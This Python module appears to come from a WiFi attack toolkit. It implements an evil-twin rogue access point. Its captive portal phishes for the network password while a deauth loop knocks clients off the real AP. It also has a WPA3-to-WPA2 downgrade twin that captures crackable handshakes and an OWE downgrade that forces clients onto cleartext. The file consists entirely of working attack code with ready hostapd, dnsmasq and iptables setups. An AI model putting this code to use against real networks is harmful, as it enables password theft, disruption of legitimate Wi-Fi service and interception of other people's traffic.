"""Evil-twin rogue AP attack.

Opens a soft-AP on iface_ap (ACHM/wlan1) broadcasting the target SSID as an
open network, runs dnsmasq for DHCP + DNS redirect, and serves a captive portal
on port 80 that harvests the submitted WiFi password.  Simultaneously deauths
clients from the real AP on iface_mon so they drift to our rogue AP.

⚠️  ACHM (mt76x0u) + hostapd can freeze the kernel on some builds.  The
caller is responsible for confirming interface bring-up before launching this
function; see the step-by-step notes in CHECKPOINT.md.

External deps: hostapd, dnsmasq, iproute2 (ip), iptables.
All run as subprocesses with explicit timeouts so a hung driver doesn't block
the tool indefinitely.
"""

from __future__ import annotations

import os
import re
import secrets
import signal
import string
import subprocess
import tempfile
import textwrap
import threading
import time
from dataclasses import dataclass
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

from ..frames import BROADCAST
from .deauth import deauth as _deauth
from .handshake import HandshakeStatus, capture_handshake as _capture_handshake

# ── constants ────────────────────────────────────────────────────────────────

_AP_IP = "10.0.0.1"
_AP_NETWORK = "10.0.0.0/24"
_DHCP_RANGE_START = "10.0.0.10"
_DHCP_RANGE_END = "10.0.0.50"
_PORTAL_PORT = 80
_CMD_TIMEOUT = 8          # seconds for ip/iptables commands
_HOSTAPD_START_WAIT = 5  # seconds to wait for hostapd to come up
_DNSMASQ_START_WAIT = 2


# ── result type ──────────────────────────────────────────────────────────────

@dataclass
class EvilTwinResult:
    """Outcome of a run_eviltwin() call."""
    success: bool = False
    password: str | None = None
    client_mac: str | None = None
    elapsed: float = 0.0
    detail: str = ""


@dataclass
class DowngradeTwinResult:
    """Outcome of a run_downgrade_twin() call."""
    status: HandshakeStatus = HandshakeStatus.NONE
    outfile: str | None = None
    elapsed: float = 0.0
    detail: str = ""


@dataclass
class OweDowngradeResult:
    """Outcome of a run_owe_downgrade() call."""
    success: bool = False
    client_mac: str | None = None
    elapsed: float = 0.0
    detail: str = ""


# ── config builders ──────────────────────────────────────────────────────────

def _hostapd_conf(iface: str, ssid: str, channel: int) -> str:
    return textwrap.dedent(f"""\
        interface={iface}
        driver=nl80211
        ssid={ssid}
        hw_mode=g
        channel={channel if channel <= 13 else 6}
        ignore_broadcast_ssid=0
        auth_algs=1
        wpa=0
    """)


def _hostapd_conf_wpa2(iface: str, ssid: str, channel: int, passphrase: str) -> str:
    """WPA2-PSK variant for downgrade_twin -- the passphrase is a throwaway
    placeholder, never the target network's real one. hostapd requires
    SOME valid 8-63 char passphrase to run in WPA-PSK mode at all, but we
    never need it to actually validate: a client auto-reconnecting with
    its own real (different) password still completes Message 1/2 of the
    4-way handshake using a PMK derived from ITS real password before
    hostapd's own MIC check on Message 2 fails and rejects it -- that
    M1+M2 pair, captured independently by capture_handshake() on iface_mon,
    is exactly the crackable CHALLENGE-status material this attack exists
    to harvest (see attacks/handshake.py's HandshakeStatus docstring)."""
    return textwrap.dedent(f"""\
        interface={iface}
        driver=nl80211
        ssid={ssid}
        hw_mode=g
        channel={channel if channel <= 13 else 6}
        ignore_broadcast_ssid=0
        auth_algs=1
        wpa=2
        wpa_passphrase={passphrase}
        wpa_key_mgmt=WPA-PSK
        rsn_pairwise=CCMP
    """)


def _random_passphrase(length: int = 32) -> str:
    """A throwaway hostapd WPA-PSK passphrase -- never the real network's
    password, just satisfies hostapd's own 8-63 char requirement."""
    alphabet = string.ascii_letters + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(length))


def _dnsmasq_conf(iface: str) -> str:
    return textwrap.dedent(f"""\
        interface={iface}
        bind-interfaces
        dhcp-range={_DHCP_RANGE_START},{_DHCP_RANGE_END},12h
        dhcp-option=option:router,{_AP_IP}
        dhcp-option=option:dns-server,{_AP_IP}
        address=/#/{_AP_IP}
        log-dhcp
        no-resolv
        no-hosts
    """)


# ── captive portal HTTP server ────────────────────────────────────────────────

_PORTAL_HTML = """\
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>WiFi Login</title>
<style>
  body {{font-family:sans-serif;background:#1a1a2e;color:#eee;
        display:flex;align-items:center;justify-content:center;height:100vh;margin:0}}
  .box {{background:#16213e;padding:2rem 2.5rem;border-radius:12px;
         box-shadow:0 4px 24px #0008;min-width:320px}}
  h2 {{margin-top:0;color:#e94560}}
  label {{display:block;margin:.8rem 0 .2rem;font-size:.9rem;color:#aaa}}
  input {{width:100%;padding:.55rem .7rem;border-radius:6px;border:1px solid #444;
          background:#0f3460;color:#eee;font-size:1rem;box-sizing:border-box}}
  button {{margin-top:1.2rem;width:100%;padding:.65rem;border:none;
           border-radius:6px;background:#e94560;color:#fff;
           font-size:1rem;cursor:pointer}}
  .ssid {{color:#e94560;font-weight:bold}}
</style>
</head>
<body>
  <div class="box">
    <h2>&#128274; WiFi Required</h2>
    <p>To access the internet, enter the password for
       <span class="ssid">{ssid}</span>.</p>
    <form method="POST" action="/submit">
      <label>Network Password</label>
      <input type="password" name="pwd" placeholder="Password" autofocus required>
      <button type="submit">Connect</button>
    </form>
  </div>
</body>
</html>
"""

_PORTAL_SUCCESS_HTML = """\
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Connecting…</title>
<style>
  body {{font-family:sans-serif;background:#1a1a2e;color:#eee;
        display:flex;align-items:center;justify-content:center;height:100vh;margin:0}}
  .box {{background:#16213e;padding:2rem 2.5rem;border-radius:12px;text-align:center}}
  h2 {{color:#4ecca3}}
</style>
</head>
<body>
  <div class="box">
    <h2>&#10003; Connecting…</h2>
    <p>Please wait while we verify your password.</p>
  </div>
</body>
</html>
"""


def _make_portal_handler(ssid: str, result_box: list):
    """Return a handler class wired to result_box[0] for the harvested password."""

    class _Handler(BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            pass  # silence default access log

        def _send(self, code: int, body: str) -> None:
            data = body.encode()
            self.send_response(code)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def do_GET(self):
            # Captive portal detection endpoints → redirect to portal
            self._send(200, _PORTAL_HTML.format(ssid=ssid))

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode(errors="replace")
            params = parse_qs(body)
            pwd = params.get("pwd", [""])[0].strip()
            if pwd and not result_box:
                result_box.append(pwd)
            self._send(200, _PORTAL_SUCCESS_HTML)

    return _Handler


# ── subprocess helpers ────────────────────────────────────────────────────────

def _run(cmd: list[str], timeout: int = _CMD_TIMEOUT, check: bool = False) -> tuple[int, str]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=check)
        return r.returncode, (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return -1, f"timeout after {timeout}s"
    except FileNotFoundError:
        return -1, f"command not found: {cmd[0]}"


def _popen(cmd: list[str]) -> subprocess.Popen:
    return subprocess.Popen(
        cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,  # noqa: PLW1509 - needed for process-group cleanup
    )


# ── interface setup / teardown ────────────────────────────────────────────────

def _assign_ip(iface: str) -> bool:
    _run(["ip", "addr", "flush", "dev", iface])
    rc, _out = _run(["ip", "addr", "add", f"{_AP_IP}/{24}", "dev", iface])
    if rc != 0:
        return False
    _run(["ip", "link", "set", iface, "up"])
    return True


def _flush_ip(iface: str) -> None:
    _run(["ip", "addr", "flush", "dev", iface])


def _iptables_nat_add(iface_ap: str, iface_mon: str) -> None:
    _run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", iface_mon, "-j", "MASQUERADE"])
    _run(["iptables", "-A", "FORWARD", "-i", iface_ap, "-o", iface_mon, "-j", "ACCEPT"])
    _run(["iptables", "-A", "FORWARD", "-i", iface_mon, "-o", iface_ap,
          "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])


def _iptables_nat_remove(iface_ap: str, iface_mon: str) -> None:
    _run(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", iface_mon, "-j", "MASQUERADE"])
    _run(["iptables", "-D", "FORWARD", "-i", iface_ap, "-o", iface_mon, "-j", "ACCEPT"])
    _run(["iptables", "-D", "FORWARD", "-i", iface_mon, "-o", iface_ap,
          "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])


def _station_dump(iface: str) -> list[str]:
    """MACs of stations currently associated to iface in AP mode, via
    `iw dev <iface> station dump`. Used by run_owe_downgrade() as the
    success signal instead of a DHCP lease -- L2 association alone is
    enough to prove the client downgraded to our open twin, even if it
    never actually requests an IP."""
    _rc, out = _run(["iw", "dev", iface, "station", "dump"])
    return re.findall(r"Station\s+([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})", out)


# ── main entry point ──────────────────────────────────────────────────────────

def run_eviltwin(
    iface_ap: str,
    iface_mon: str,
    bssid: str,
    ssid: str,
    channel: int,
    client: str = BROADCAST,
    timeout: float = 120.0,
    stop_event: threading.Event | None = None,
    progress_fn=None,
) -> EvilTwinResult:
    """Launch the full evil-twin chain and wait for a password submission.

    Args:
        iface_ap:  Interface to bring up as AP (ACHM/wlan1 in managed mode).
        iface_mon: Interface already in monitor mode for deauth.
        bssid:     Real AP's BSSID — used only for deauth targeting.
        ssid:      Target network name — shown on the portal and broadcast.
        channel:   Channel for the rogue AP (2.4GHz preferred; clamped to 1-13).
        client:    MAC to target the deauth loop at (2026-08-30: was always
            BROADCAST here regardless of caller — see the same fix in
            gui/attack_runner.py's pincer()/eviltwin() and gui/app.py's
            _auto_deauth_run()). Defaults to BROADCAST when the caller has no
            discovered client to target, same as deauth()'s own default.
        timeout:   Seconds before giving up if no password submitted.
        stop_event: Set externally to abort early.
        progress_fn: Optional callback for live per-step status (hostapd/
            dnsmasq/portal launch, each deauth round) -- previously this
            attack gave zero feedback until it fully succeeded or timed
            out, minutes later.
    """
    log = progress_fn or (lambda msg: None)
    stop = stop_event or threading.Event()
    t_start = time.monotonic()
    procs: list[subprocess.Popen] = []
    tmpfiles: list[str] = []
    servers: list[HTTPServer] = []

    def cleanup():
        for p in procs:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        for srv in servers:
            try:
                srv.server_close()
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        for f in tmpfiles:
            try:
                os.unlink(f)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        _flush_ip(iface_ap)
        _iptables_nat_remove(iface_ap, iface_mon)

    try:
        # ── 1. assign IP to AP interface ──────────────────────────────────
        log(f"assigning IP to {iface_ap}")
        if not _assign_ip(iface_ap):
            log("failed to assign IP")
            return EvilTwinResult(detail="failed to assign IP to AP interface")

        # ── 2. write temp configs ─────────────────────────────────────────
        ap_chan = channel if 1 <= channel <= 13 else 6

        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                          prefix="atwa_hostapd_", delete=False) as hconf:
            hconf.write(_hostapd_conf(iface_ap, ssid, ap_chan))
        tmpfiles.append(hconf.name)

        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                          prefix="atwa_dnsmasq_", delete=False) as dconf:
            dconf.write(_dnsmasq_conf(iface_ap))
        tmpfiles.append(dconf.name)

        # ── 3. launch hostapd ─────────────────────────────────────────────
        # ⚠️ CHECKPOINT: driver risk here — mt76x0u can freeze on AP mode.
        log(f"starting hostapd on {iface_ap} (ssid={ssid!r}, channel={ap_chan})")
        hostapd_proc = _popen(["hostapd", hconf.name])
        procs.append(hostapd_proc)
        time.sleep(_HOSTAPD_START_WAIT)
        if hostapd_proc.poll() is not None:
            log("hostapd exited immediately")
            return EvilTwinResult(detail="hostapd exited immediately — check interface/driver")
        log("hostapd up")

        # ── 4. launch dnsmasq ─────────────────────────────────────────────
        log("starting dnsmasq (DHCP/DNS for rogue AP)")
        dns_proc = _popen(["dnsmasq", "--no-daemon", f"--conf-file={dconf.name}"])
        procs.append(dns_proc)
        time.sleep(_DNSMASQ_START_WAIT)
        log("dnsmasq up")

        # ── 5. iptables NAT (optional — lets clients reach portal) ────────
        _iptables_nat_add(iface_ap, iface_mon)
        log("NAT rules added")

        # ── 6. captive portal HTTP server (background thread) ─────────────
        result_box: list[str] = []
        handler = _make_portal_handler(ssid, result_box)
        server = HTTPServer((_AP_IP, _PORTAL_PORT), handler)
        server.timeout = 1.0
        servers.append(server)

        def _serve():
            while not stop.is_set() and not result_box:
                server.handle_request()

        srv_thread = threading.Thread(target=_serve, daemon=True)
        srv_thread.start()
        log(f"captive portal listening on {_AP_IP}:{_PORTAL_PORT}")

        # ── 7. deauth loop (background thread) ────────────────────────────
        def _deauth_loop():
            round_n = 0
            while not stop.is_set() and not result_box:
                round_n += 1
                try:
                    sent = _deauth(iface_mon, bssid, client=client, channel=channel, progress_fn=log)
                    if sent == 0:
                        log(f"eviltwin deauth round {round_n}: did NOT go out to {bssid} — see the warning above")
                    else:
                        log(f"eviltwin deauth round {round_n}: sent {sent} deauth frame(s) to {bssid}")
                except Exception as exc:  # noqa: BLE001 - deauth loop must survive any one-round error
                    log(f"eviltwin deauth round {round_n} failed: {exc}")
                stop.wait(10.0)

        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
        deauth_thread.start()

        # ── 8. wait for password or timeout ──────────────────────────────
        log(f"waiting up to {timeout:.0f}s for a password submission")
        deadline = time.monotonic() + timeout
        while not stop.is_set() and not result_box:
            if time.monotonic() >= deadline:
                break
            time.sleep(0.5)

        elapsed = time.monotonic() - t_start

        if result_box:
            stop.set()
            log(f"password captured after {elapsed:.0f}s")
            return EvilTwinResult(
                success=True,
                password=result_box[0],
                elapsed=elapsed,
                detail=f"password captured after {elapsed:.0f}s",
            )
        log("no password submitted" if not stop.is_set() else "stopped")
        return EvilTwinResult(
            elapsed=elapsed,
            detail="timeout — no password submitted" if not stop.is_set() else "aborted",
        )

    finally:
        stop.set()
        cleanup()


# ── downgrade_twin: WPA3-transition rogue WPA2-only twin ──────────────────────

def run_downgrade_twin(
    iface_ap: str,
    iface_mon: str,
    bssid: str,
    ssid: str,
    channel: int,
    outfile: str,
    client: str = BROADCAST,
    timeout: float = 120.0,
    stop_event: threading.Event | None = None,
    progress_fn=None,
) -> DowngradeTwinResult:
    """Broadcast a WPA2-only rogue twin of a WPA3-transition-mode target,
    deauth clients off the real AP, and passively capture whatever 4-way
    handshake a client attempts against the twin using its own real
    password (see secure.py's downgrade_twin recommendation and
    _hostapd_conf_wpa2()'s docstring for why this needs no real
    passphrase to be useful).

    Much smaller than run_eviltwin() -- no DHCP/NAT/captive portal, since
    the 4-way handshake completes entirely before any IP is assigned.
    Args mirror run_eviltwin() where they mean the same thing:
        iface_ap:  interface to bring up as the rogue AP.
        iface_mon: interface for both the deauth loop and the passive
            handshake listener -- monitor mode hears our own AP traffic
            fine, no second physical radio required.
        bssid:     the REAL AP's BSSID, used only for deauth targeting.
        outfile:   where to write the captured handshake pcap.
    """
    log = progress_fn or (lambda msg: None)
    stop = stop_event or threading.Event()
    t_start = time.monotonic()
    procs: list[subprocess.Popen] = []
    tmpfiles: list[str] = []

    def cleanup():
        for p in procs:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        for f in tmpfiles:
            try:
                os.unlink(f)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        _flush_ip(iface_ap)

    try:
        log(f"assigning IP to {iface_ap}")
        if not _assign_ip(iface_ap):
            log("failed to assign IP")
            return DowngradeTwinResult(detail="failed to assign IP to AP interface")

        ap_chan = channel if 1 <= channel <= 13 else 6
        passphrase = _random_passphrase()

        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                          prefix="atwa_hostapd_dt_", delete=False) as hconf:
            hconf.write(_hostapd_conf_wpa2(iface_ap, ssid, ap_chan, passphrase))
        tmpfiles.append(hconf.name)

        log(f"starting WPA2-only rogue twin on {iface_ap} (ssid={ssid!r}, channel={ap_chan})")
        hostapd_proc = _popen(["hostapd", hconf.name])
        procs.append(hostapd_proc)
        time.sleep(_HOSTAPD_START_WAIT)
        if hostapd_proc.poll() is not None:
            log("hostapd exited immediately")
            return DowngradeTwinResult(detail="hostapd exited immediately — check interface/driver")
        log("rogue twin up")

        from ..radio import get_mac
        try:
            rogue_bssid = get_mac(iface_ap)
        except Exception:  # noqa: BLE001 - reported to the caller below either way
            log("could not determine rogue twin's own BSSID — aborting")
            return DowngradeTwinResult(detail="could not determine rogue AP interface's MAC address")
        log(f"rogue twin BSSID: {rogue_bssid}")

        listen_result: dict = {}

        def _listen():
            listen_result["cap"] = _capture_handshake(
                iface_mon, rogue_bssid, channel=ap_chan, timeout=timeout,
                outfile=outfile, stop_event=stop, progress_fn=log,
            )

        listener = threading.Thread(target=_listen, daemon=True)
        listener.start()
        log(f"listening for a handshake against the rogue twin, writing to {outfile}")

        def _deauth_loop():
            round_n = 0
            while not stop.is_set():
                round_n += 1
                try:
                    sent = _deauth(iface_mon, bssid, client=client, channel=channel, progress_fn=log)
                    if sent == 0:
                        log(f"downgrade_twin deauth round {round_n}: did NOT go out to {bssid} — see the warning above")
                    else:
                        log(f"downgrade_twin deauth round {round_n}: sent {sent} deauth frame(s) to {bssid}")
                except Exception as exc:  # noqa: BLE001 - deauth loop must survive any one-round error
                    log(f"downgrade_twin deauth round {round_n} failed: {exc}")
                stop.wait(10.0)

        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
        deauth_thread.start()

        def _best_status() -> HandshakeStatus:
            cap = listen_result.get("cap")
            if cap is None or not cap.messages:
                return HandshakeStatus.NONE
            best = HandshakeStatus.NONE
            for a, c in cap.messages:
                status = cap.status(a, c)
                if status is HandshakeStatus.AUTHORIZED:
                    return HandshakeStatus.AUTHORIZED
                if status is HandshakeStatus.CHALLENGE:
                    best = HandshakeStatus.CHALLENGE
            return best

        log(f"waiting up to {timeout:.0f}s for a client to attempt the rogue twin")
        deadline = time.monotonic() + timeout
        best = HandshakeStatus.NONE
        while not stop.is_set() and time.monotonic() < deadline:
            best = _best_status()
            if best is not HandshakeStatus.NONE:
                break
            time.sleep(0.5)

        stop.set()
        listener.join(timeout=5)
        elapsed = time.monotonic() - t_start

        if best is HandshakeStatus.NONE:
            # listener.join() above guarantees listen_result["cap"] now
            # reflects its final state, catching the race between the
            # poll loop's last check and the listener thread actually
            # finishing.
            best = _best_status()

        if best is HandshakeStatus.NONE:
            log("no handshake captured against the rogue twin")
            return DowngradeTwinResult(elapsed=elapsed, detail="no client attempted the rogue twin")
        log(f"captured a {best.value} handshake against the rogue twin -> {outfile}")
        return DowngradeTwinResult(
            status=best, outfile=outfile, elapsed=elapsed,
            detail=f"{best.value} handshake captured (real password, unverified by us) -> {outfile}",
        )

    finally:
        stop.set()
        cleanup()


# ── owe_downgrade: OWE-transition rogue OPEN twin ──────────────────────────────

def run_owe_downgrade(
    iface_ap: str,
    iface_mon: str,
    owe_bssid: str,
    open_ssid: str,
    channel: int,
    client: str = BROADCAST,
    timeout: float = 120.0,
    stop_event: threading.Event | None = None,
    progress_fn=None,
) -> OweDowngradeResult:
    """OWE (Enhanced Open) transition-mode downgrade: broadcast the target's
    own already-advertised paired open network (open_ssid, discovered via
    secure.owe_transition_info()) as our own rogue AP, and deauth clients
    off the REAL OWE bssid so they fall back to it.

    Unlike run_eviltwin()/run_downgrade_twin(), there's nothing to
    harvest here -- OWE has no password, and this rogue twin is open, not
    WPA2-PSK -- the whole point of OWE-transition mode downgrade is that
    a client's traffic goes back to cleartext the moment it associates.
    Success is simply a client associating (checked via `iw ... station
    dump`, not a DHCP lease, since L2 association alone already proves
    the downgrade regardless of whether the client ever requests an IP).
    No captive portal -- there's no password to collect.

    Args mirror run_eviltwin() where they mean the same thing:
        owe_bssid: the REAL OWE BSSID -- used only for deauth targeting.
        open_ssid: the paired open network's SSID (from the transition
            IE), broadcast by our rogue AP.
    """
    log = progress_fn or (lambda msg: None)
    stop = stop_event or threading.Event()
    t_start = time.monotonic()
    procs: list[subprocess.Popen] = []
    tmpfiles: list[str] = []

    def cleanup():
        for p in procs:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        for f in tmpfiles:
            try:
                os.unlink(f)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        _flush_ip(iface_ap)
        _iptables_nat_remove(iface_ap, iface_mon)

    try:
        log(f"assigning IP to {iface_ap}")
        if not _assign_ip(iface_ap):
            log("failed to assign IP")
            return OweDowngradeResult(detail="failed to assign IP to AP interface")

        ap_chan = channel if 1 <= channel <= 13 else 6

        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                          prefix="atwa_hostapd_owe_", delete=False) as hconf:
            hconf.write(_hostapd_conf(iface_ap, open_ssid, ap_chan))
        tmpfiles.append(hconf.name)

        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                          prefix="atwa_dnsmasq_owe_", delete=False) as dconf:
            dconf.write(_dnsmasq_conf(iface_ap))
        tmpfiles.append(dconf.name)

        log(f"starting open rogue twin on {iface_ap} (ssid={open_ssid!r}, channel={ap_chan})")
        hostapd_proc = _popen(["hostapd", hconf.name])
        procs.append(hostapd_proc)
        time.sleep(_HOSTAPD_START_WAIT)
        if hostapd_proc.poll() is not None:
            log("hostapd exited immediately")
            return OweDowngradeResult(detail="hostapd exited immediately — check interface/driver")
        log("rogue twin up")

        log("starting dnsmasq (DHCP/DNS for rogue AP)")
        dns_proc = _popen(["dnsmasq", "--no-daemon", f"--conf-file={dconf.name}"])
        procs.append(dns_proc)
        time.sleep(_DNSMASQ_START_WAIT)
        log("dnsmasq up")

        _iptables_nat_add(iface_ap, iface_mon)
        log("NAT rules added")

        def _deauth_loop():
            round_n = 0
            while not stop.is_set():
                round_n += 1
                try:
                    sent = _deauth(iface_mon, owe_bssid, client=client, channel=channel, progress_fn=log)
                    if sent == 0:
                        log(f"owe_downgrade deauth round {round_n}: did NOT go out to {owe_bssid} — see the warning above")
                    else:
                        log(f"owe_downgrade deauth round {round_n}: sent {sent} deauth frame(s) to {owe_bssid}")
                except Exception as exc:  # noqa: BLE001 - deauth loop must survive any one-round error
                    log(f"owe_downgrade deauth round {round_n} failed: {exc}")
                stop.wait(10.0)

        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
        deauth_thread.start()

        log(f"waiting up to {timeout:.0f}s for a client to associate to the open twin")
        deadline = time.monotonic() + timeout
        associated: str | None = None
        while not stop.is_set() and time.monotonic() < deadline:
            stations = _station_dump(iface_ap)
            if stations:
                associated = stations[0]
                break
            time.sleep(1.0)

        stop.set()
        elapsed = time.monotonic() - t_start

        if associated is None:
            log("no client associated with the open twin")
            return OweDowngradeResult(elapsed=elapsed, detail="no client associated with the open twin")
        log(f"client {associated} associated with the open twin -> downgraded to cleartext")
        return OweDowngradeResult(
            success=True, client_mac=associated, elapsed=elapsed,
            detail=f"client {associated} downgraded to open (cleartext) after {elapsed:.0f}s",
        )

    finally:
        stop.set()
        cleanup()
